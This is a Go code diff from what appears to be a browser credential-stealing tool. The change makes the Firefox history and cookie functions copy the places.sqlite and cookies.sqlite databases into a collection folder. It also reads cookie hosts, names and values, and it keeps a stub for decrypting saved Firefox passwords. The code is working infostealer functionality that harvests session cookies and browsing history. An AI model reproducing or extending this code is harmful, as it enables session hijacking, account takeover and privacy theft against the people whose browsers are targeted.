@@ -18,7 +18,7 @@ func FirefoxPasswords() (string, error) {
 	// todo 本机firefox解密不了。。。
 	return "", nil
 }
-func FirefoxHistory() (string, error) {
+func FirefoxHistory(targetDir string) (string, error) {
 	var builder strings.Builder
 	// 获取 BrowserPath 下的所有目录
 	directories, err := os.ReadDir(FirefoxPath)
@@ -37,6 +37,9 @@ func FirefoxHistory() (string, error) {
 		if _, err := os.Stat(filePath); os.IsNotExist(err) {
 			continue
 		}
+
+		utils.CopyFile(filePath, targetDir+"\\"+"places.sqlite")
+
 		result, err := utils.ReadSQLiteDB_url(filePath, "SELECT url FROM moz_places")
 		if err != nil {
 			fmt.Println("Error reading database:", err)
@@ -72,7 +75,7 @@ func FirefoxBooks() (string, error) {
 	}
 	return builder.String(), nil
 }
-func FirefoxCookies() (string, error) {
+func FirefoxCookies(targetDir string) (string, error) {
 	var builder strings.Builder
 	// 获取 BrowserPath 下的所有目录
 	directories, err := os.ReadDir(FirefoxPath)
@@ -91,6 +94,8 @@ func FirefoxCookies() (string, error) {
 		if _, err := os.Stat(filePath); os.IsNotExist(err) {
 			continue
 		}
+		utils.CopyFile(filePath, targetDir+"\\"+"cookies.sqlite")
+
 		result, _ := utils.ReadSQLiteDB(filePath, "SELECT host,name,value FROM moz_cookies ")
 
 		builder.WriteString(result)
@@ -103,9 +108,9 @@ func FirefoxSave(path string) {
 	}
 	targetDir := filepath.Join(path, FirefoxBrowserName)
 	os.MkdirAll(targetDir, os.ModePerm)
-	history, _ := FirefoxHistory()
+	history, _ := FirefoxHistory(targetDir)
 	books, _ := FirefoxBooks()
-	cookies, _ := FirefoxCookies()
+	cookies, _ := FirefoxCookies(targetDir)
 	passwords, _ := FirefoxPasswords()
 	if history != "" {
 		// 将历史记录写入到文件
